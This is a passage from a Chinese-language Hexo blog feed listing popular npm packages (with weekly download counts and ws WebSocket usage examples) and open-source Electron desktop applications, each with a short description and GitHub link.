name="wKS1i"></a></p><h2 id="9-Ajv"><a href="#9-Ajv" class="headerlink" title="9. Ajv"></a>9. Ajv</h2><p>Ajv 是一个适用于 Node.js 和浏览器的最快 JSON 验证器。它支持 JSON Schema Draft-04&#x2F;06&#x2F;07&#x2F;2019-09&#x2F;2020-12 和 JSON 类型定义 (RFC8927)。</p><p>Ajv 每周下载量：<strong>72,378,941</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648831173065-e1d82feb-fea3-4db9-9861-4e8cdfb4b6d9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648831173065-e1d82feb-fea3-4db9-9861-4e8cdfb4b6d9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/ajv-validator/ajv">https://github.com/ajv-validator/ajv</a></p><p><a name="kKu5N"></a></p><h2 id="10-yallist"><a href="#10-yallist" class="headerlink" title="10. yallist"></a>10. yallist</h2><p>yallist 是一个双向链表的实现。</p><p>yallist 每周下载量：<strong>70,872,400</strong></p><p><strong>GitHub：</strong><a href="https://github.com/isaacs/yallist">https://github.com/isaacs/yallist</a></p><p><a name="ZhJqR"></a></p><h2 id="11-postcss"><a href="#11-postcss" class="headerlink" title="11. postcss"></a>11. postcss</h2><p>PostCSS 是一个允许使用插件转换样式的插件。这些可以检查（lint）你的 CSS，支持 CSS 变量和 Mixins，编译尚未被浏览器广泛支持的先进的 CSS 语法，内联图片，以及其他许多优秀的工具的功能。</p><p>postcss 每周下载量：<strong>67,390,371</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648831685539-9edbd81e-7e37-4a5f-ab26-28c1f0a78225.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648831685539-9edbd81e-7e37-4a5f-ab26-28c1f0a78225.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/postcss/postcss">https://github.com/postcss/postcss</a></p><p><a name="uylsi"></a></p><h2 id="12-rimraf"><a href="#12-rimraf" class="headerlink" title="12. rimraf"></a>12. rimraf</h2><p>rimraf 是 Node.js 的 rm -rf 实用程序。以包的形式包装 rm -rf 命令，用来删除文件和文件夹，不管文件夹是否为空，都可以删除。</p><p>rimraf 每周下载量：<strong>67,101,067</strong></p><p><strong>GitHub：</strong><a href="https://github.com/isaacs/rimraf">https://github.com/isaacs/rimraf</a></p><p><a name="LW1Xq"></a></p><h2 id="13-emoji-regex"><a href="#13-emoji-regex" class="headerlink" title="13. emoji-regex"></a>13. emoji-regex</h2><p>emoji-regex 提供了一个正则表达式来匹配所有 emoji 符号和序列（包括 emoji 的文本表示），符合 Unicode 标准。 它基于 emoji-test-regex-pattern，它生成（在构建时）基于 Unicode 标准的正则表达式模式。 因此，只要将新的表情符号添加到 Unicode 中，就可以轻松更新 emoji-regex。</p><p>emoji-regex 每周下载量：<strong>61,794,047</strong></p><p><strong>GitHub：</strong><a href="https://github.com/mathiasbynens/emoji-regex">https://github.com/mathiasbynens/emoji-regex</a></p><p><a name="o0OnK"></a></p><h2 id="14-mkdirp"><a href="#14-mkdirp" class="headerlink" title="14. mkdirp"></a>14. mkdirp</h2><p><strong>mkdirp</strong> 可以在 Node.js 中像 mkdir -p 一样递归创建目录及其子目录。</p><p>mkdirp 每周下载量：<strong>61,036,270</strong></p><p><strong>GitHub：</strong><a href="https://github.com/isaacs/node-mkdirp">https://github.com/isaacs/node-mkdirp</a></p><p><a name="PRWoc"></a></p><h2 id="15-ws"><a href="#15-ws" class="headerlink" title="15. ws"></a>15. ws</h2><p>ws 是一个简单易用、速度极快且经过全面测试的 WebSocket 客户端和服务器实现。</p><p>ws 每周下载量：<strong>59,114,745</strong><br><a name="URrFe"></a></p><h3 id="Sending-and-receiving-text-data"><a href="#Sending-and-receiving-text-data" class="headerlink" title="Sending and receiving text data"></a>Sending and receiving text data</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">WebSocket</span> <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://www.host.com/path&quot;</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;open&quot;</span>, <span class="keyword">function</span> <span class="title function_">open</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="string">&quot;something&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="keyword">function</span> <span class="title function_">message</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;received: %s&quot;</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="EgnPz"></a></p><h3 id="Sending-binary-data"><a href="#Sending-binary-data" class="headerlink" title="Sending binary data"></a>Sending binary data</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">WebSocket</span> <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://www.host.com/path&quot;</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;open&quot;</span>, <span class="keyword">function</span> <span class="title function_">open</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> array = <span class="keyword">new</span> <span class="title class_">Float32Array</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">    array[i] = i / <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ws.<span class="title function_">send</span>(array);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="tiIAP"></a></p><h3 id="Simple-server"><a href="#Simple-server" class="headerlink" title="Simple server"></a>Simple server</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">WebSocketServer</span> &#125; <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wss = <span class="keyword">new</span> <span class="title class_">WebSocketServer</span>(&#123; <span class="attr">port</span>: <span class="number">8080</span> &#125;);</span><br><span class="line"></span><br><span class="line">wss.<span class="title function_">on</span>(<span class="string">&quot;connection&quot;</span>, <span class="keyword">function</span> <span class="title function_">connection</span>(<span class="params">ws</span>) &#123;</span><br><span class="line">  ws.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">  ws.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="keyword">function</span> <span class="title function_">message</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;received: %s&quot;</span>, data);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="string">&quot;something&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br /><strong>GitHub：</strong><a href="https://github.com/websockets/ws">https://github.com/websockets/ws</a></p><p><a name="MZjaW"></a></p><h2 id="16-async"><a href="#16-async" class="headerlink" title="16. async"></a>16. async</h2><p>Async 是一个实用模块，它为使用异步 JavaScript 提供了直接、强大的功能。虽然最初设计用于 Node.js，但是它也可以直接在浏览器中使用。</p><p>async 每周下载量：<strong>56,387,506</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648832709276-11d64c6a-e883-49f3-88ab-88e7b30bddf6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648832709276-11d64c6a-e883-49f3-88ab-88e7b30bddf6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/caolan/async">https://github.com/caolan/async</a></p><p><a name="ywOBi"></a></p><h2 id="17-minimist"><a href="#17-minimist" class="headerlink" title="17. minimist"></a>17. minimist</h2><p>minimist 是一个用来解析命令行选项的库。</p><p>minimist 每周下载量：<strong>51,722,555</strong></p><p><strong>GitHub：</strong><a href="https://github.com/substack/minimist">https://github.com/substack/minimist</a></p><p><a name="V6xT8"></a></p><h2 id="18-js-yaml"><a href="#18-js-yaml" class="headerlink" title="18. js-yaml"></a>18. js-yaml</h2><p>js-yaml 是一个用于 JavaScript 的 YAML 1.2 解析器&#x2F;编写器。这是 YAML 的一个实现，一种对人类友好的数据序列化语言。从 PyYAML 端口开始，它完全从头开始重写。现在它非常快，并且支持 1.2 规范。</p><p>js-yaml 每周下载量：<strong>51,863,321</strong></p><p><strong>GitHub：</strong><a href="https://github.com/nodeca/js-yaml">https://github.com/nodeca/js-yaml</a></p><p><a name="nhnSC"></a></p><h2 id="19-form-data"><a href="#19-form-data" class="headerlink" title="19. form-data"></a>19. form-data</h2><p>form-data 是一个用于创建可读”multipart&#x2F;form-data”流的库。可用于向其他 Web 应用程序提交表单和文件上传。</p><p>form-data 每周下载量：<strong>50,307,183</strong></p><p><strong>GitHub：</strong><a href="https://github.com/form-data/form-data">https://github.com/form-data/form-data</a></p><p><a name="B8GiR"></a></p><h2 id="20-lodash"><a href="#20-lodash" class="headerlink" title="20. lodash"></a>20. lodash</h2><p>lodash 是一个 JavaScript 实用工具库，提供一致性，及模块化、性能和配件等功能。Lodash 消除了处理数组的麻烦，从而简化了 JavaScript、 数字、对象、字符串等。它的模块化方法非常适合：迭代数组，对象和字符串、操作和测试值、创建复合功能。</p><p>Lodash 每周下载量：<strong>50,027,873</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648833682253-c41473ee-e0e6-41dd-9420-4eabfe66436b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648833682253-c41473ee-e0e6-41dd-9420-4eabfe66436b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/lodash/lodash">https://github.com/lodash/lodash</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 热门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨平台桌面项目</title>
      <link href="/2023/06/30/frontend/collection/projects/kua-ping-tai-zhuo-mian-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/kua-ping-tai-zhuo-mian-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="全文概览："><a href="#全文概览：" class="headerlink" title="全文概览："></a>全文概览：</h2><ol><li><strong>windows95：</strong>Electron 中的 Windows 95；<br />2. <strong>drawio-desktop</strong>：基于 Electron 的图表和白板桌面应用；<br />3. <strong>MarkText</strong>：简单而优雅的开源 Markdown 编辑器；<br />4. <strong>Trilium</strong>：分层的笔记应用，专注于建立大型个人知识库；<br />5. <strong>Joplin</strong>：笔记和待办事项应用；<br />6. <strong>lx-music-desktop</strong>：基于 Electron 17 + Vue 3 的音乐软件；<br />7. <strong>YesPlayMusic</strong>：高颜值的第三方网易云播放器；<br />8. <strong>Cider</strong>：全新跨平台 Apple Music 体验；<br />9. <strong>ZY Player</strong>：跨平台桌面端视频资源播放器；<br />10. <strong>Nylas Mail</strong>：可扩展的邮件客户端；<br />11. <strong>PicGo</strong>：用于上传图片并获取图片 URL 链接的工具；<br />12. <strong>Awesome Electron</strong>：Electron 资源汇总；</li></ol><h2 id="1-windows95"><a href="#1-windows95" class="headerlink" title="1. windows95"></a>1. windows95</h2><p>这是一个运行在 Electron 中的 Windows 95，可以在 macOS、Linux 和 Windows 上运行。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663945292896-9847a3fe-39d4-4ed5-98dd-a2ad65e1aee1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663945292896-9847a3fe-39d4-4ed5-98dd-a2ad65e1aee1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/felixrieseberg/windows95">https://github.com/felixrieseberg/windows95</a></p><h2 id="2-drawio-desktop"><a href="#2-drawio-desktop" class="headerlink" title="2. drawio-desktop"></a>2. drawio-desktop</h2><p>drawio-desktop 是一个基于 Electron 的图表和白板桌面应用，其可以用于绘制流程图、类图、组织结构图、泳道图、E-R 图等，模板丰富。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663947145746-9dcc9833-20e7-4400-a1e3-3535ff647fc8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663947145746-9dcc9833-20e7-4400-a1e3-3535ff647fc8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/jgraph/drawio-desktop">https://github.com/jgraph/drawio-desktop</a></p><p>**3. MarkText<br>MarkText 是一个简单而优雅的开源 Markdown 编辑器，专注于速度和可用性。MarkText 具有简单明了的界面，并支持实时预览，让用户可以获得无干扰的写作体验。其支持各种主题，并支持多种笔记模式，可以输出 HTML 和 PDF 文件等。MarkText 支持在 MACOS、Windows、Linux 系统使用。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663945103095-b077dea9-d84c-4958-9c93-c646517986f0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663945103095-b077dea9-d84c-4958-9c93-c646517986f0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/marktext/marktext">https://github.com/marktext/marktext</a></p><h2 id="4-Trilium"><a href="#4-Trilium" class="headerlink" title="4. Trilium"></a>4. Trilium</h2><p>Trilium Notes 是一个分层的笔记应用，专注于建立大型个人知识库。其具有以下特性：<br />● 笔记可以排列成任意深的树。单个笔记可以放在树中的多个位置<br />● 丰富的所见即所得笔记编辑功能，包括带有 markdown 自动格式化功能的表格，图像和数学<br />● 支持编辑使用源代码的笔记，包括语法高亮显示<br />● 笔记之间快速导航，全文搜索和笔记挂起<br />● 无缝笔记版本控制<br />● 笔记属性可用于笔记组织，查询和高级脚本编写<br />● 同步与自托管同步服务器<br />● 具有按笔记粒度的强大的笔记加密<br />● 关系图和链接图，用于可视化笔记及其关系<br />● 脚本-请参阅高级展示<br />● 可用性和性能均能很好地扩展至超过 10 万个笔记<br />● 针对智能手机和平板电脑进行触摸优化的移动前端<br />● 夜间主题<br />●Evernote 和 Markdown 导入导出<br />●Web Clipper 可轻松保存 Web 内容</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663945499791-f5d53047-870a-4947-a33c-438dc5cd4bf7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663945499791-f5d53047-870a-4947-a33c-438dc5cd4bf7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/zadam/trilium">https://github.com/zadam/trilium</a></p><h2 id="5-Joplin"><a href="#5-Joplin" class="headerlink" title="5. Joplin"></a>5. Joplin</h2><p>Joplin 是一个免费的开源笔记和待办事项应用，可以处理大量组织成笔记本的笔记。笔记是可搜索的，可以直接从应用或自己的文本编辑器复制、标记和修改。笔记采用 Markdown 格式。该应用适用于 Windows、Linux、macOS、Android 和 iOS。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946115666-73304348-7b23-4881-b179-dd8c5b01d7ab.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946115666-73304348-7b23-4881-b179-dd8c5b01d7ab.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/laurent22/joplin">https://github.com/laurent22/joplin</a></p><h2 id="6-lx-music-desktop"><a href="#6-lx-music-desktop" class="headerlink" title="6. lx-music-desktop"></a>6. lx-music-desktop</h2><p>lx-music-desktop 是一个基于 Electron 17 + Vue 3 的音乐软件。其支持在 Windows、Mac OS、Linux、Android 平台上运行。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946003083-64ec22e6-9baa-4cdb-910d-564446ff6d02.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946003083-64ec22e6-9baa-4cdb-910d-564446ff6d02.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/lyswhut/lx-music-desktop">https://github.com/lyswhut/lx-music-desktop</a></p><h2 id="7-YesPlayMusic"><a href="#7-YesPlayMusic" class="headerlink" title="7. YesPlayMusic"></a>7. YesPlayMusic</h2><p>YesPlayMusic 是一个高颜值的第三方网易云播放器，支持 Windows &#x2F; macOS &#x2F; Linux。其具有以下特性：<br />● 使用 Vue.js 全家桶开发<br />● 网易云账号登录（扫码&#x2F;手机&#x2F;邮箱登录）<br />● 支持 MV 播放<br />● 支持歌词显示<br />● 支持私人 FM &#x2F; 每日推荐歌曲<br />● 每日自动签到（手机端和电脑端同时签到）<br />●Light&#x2F;Dark Mode 自动切换<br />● 支持 Touch Bar<br />● 支持 PWA，可在 Chrome&#x2F;Edge 里点击地址栏右边的 ➕ 安装到电脑<br />● 支持 Last.fm Scrobble<br />● 支持音乐云盘<br />● 自定义快捷键和全局快捷键<br />● 支持 Mpris</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946859352-b40af19a-09b5-44df-80b2-32b76aa6cff1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946859352-b40af19a-09b5-44df-80b2-32b76aa6cff1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/qier222/YesPlayMusic">https://github.com/qier222/YesPlayMusic</a></p><h2 id="8-Cider"><a href="#8-Cider" class="headerlink" title="8. Cider"></a>8. Cider</h2><p>基于 Electron 和 Vue.js 的全新跨平台 Apple Music 体验，从头开始编写，同时兼顾性能和视觉效果。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946566421-2ec47d12-a920-487b-9947-44117b403e33.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946566421-2ec47d12-a920-487b-9947-44117b403e33.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/ciderapp/Cider">https://github.com/ciderapp/Cider</a></p><h2 id="9-ZY-Player"><a href="#9-ZY-Player" class="headerlink" title="9. ZY Player"></a>9. ZY Player</h2><p>ZY Player 是一个跨平台桌面端视频资源播放器，其具有以下特性：<br />● 全平台支持：Windows、Mac、Linux<br />● 支持 IPTV, 卫视直播<br />● 视频源支持自定义, 支持导入, 导出<br />● 支持海报模式和列表模式浏览资源<br />● 播放历史, 自动跳转历史进度<br />● 收藏夹支持导入,导出, 支持同步追剧<br />● 支持精简模式, 摸鱼划水<br />● 一键搜索所有资源, 支持历史搜索记录<br />● 导出资源下载链接<br />● 支持第三方播放器播放<br />● 显示豆瓣评分</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946429335-ca041f04-7f21-420b-974c-d52a02d127b9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946429335-ca041f04-7f21-420b-974c-d52a02d127b9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/Hunlongyu/ZY-Player">https://github.com/Hunlongyu/ZY-Player</a></p><h2 id="10-Nylas-Mail"><a href="#10-Nylas-Mail" class="headerlink" title="10. Nylas Mail"></a>10. Nylas Mail</h2><p>Nylas Mail 是一个使用 Electron、React 和 Flux 构建的开源、可扩展的邮件客户端。它被设计为易于扩展，并且有许多第三方插件可以为客户端添加功能。其兼容上百种邮件提供商，作为桌面应用它可以离线运行。适用于 Mac, Windows 和 Linux。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946811228-e124ed96-2260-4728-aae1-203440ec6fab.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663946811228-e124ed96-2260-4728-aae1-203440ec6fab.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/nylas/nylas-mail">https://github.com/nylas/nylas-mail</a></p><h2 id="11-PicGo"><a href="#11-PicGo" class="headerlink" title="11. PicGo"></a>11. PicGo</h2><p>PicGo 是一个用于快速上传图片并获取图片 URL 链接的工具。其具有以下特性：<br />● 支持拖拽图片上传<br />● 支持快捷键上传剪贴板里第一张图片<br />●Windows 和 macOS 支持右键图片文件通过菜单上传 (v2.1.0+)<br />● 上传图片后自动复制链接到剪贴板<br />● 支持自定义复制到剪贴板的链接格式<br />● 支持修改快捷键<br />● 支持插件系统，已有插件支持 Gitee、青云等第三方图床<br />● 支持通过发送 HTTP 请求调用 PicGo 上传（v2.2.0+)</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663948722447-2764875c-530f-4e7e-9c8f-1ac546983671.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663948722447-2764875c-530f-4e7e-9c8f-1ac546983671.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p><h2 id="12-Awesome-Electron"><a href="#12-Awesome-Electron" class="headerlink" title="12. Awesome Electron"></a>12. Awesome Electron</h2><p>Awesome Electron 是使用 Electron 创建应用的有用资源。包含文章、图书、视频、播客、文档、工具等资源。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663947665244-a6afd01d-db41-4b0b-8690-95d9aa5a0e9d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663947665244-a6afd01d-db41-4b0b-8690-95d9aa5a0e9d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/sindresorhus/awesome-electron">https://github.com/sindresorhus/awesome-electron</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 桌面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序文件预览</title>
      <link href="/2023/06/29/solution/wei-xin-xiao-cheng-xu-wen-jian-yu-lan/"/>
      <url>/2023/06/29/solution/wei-xin-xiao-cheng-xu-wen-jian-yu-lan/</url>
      
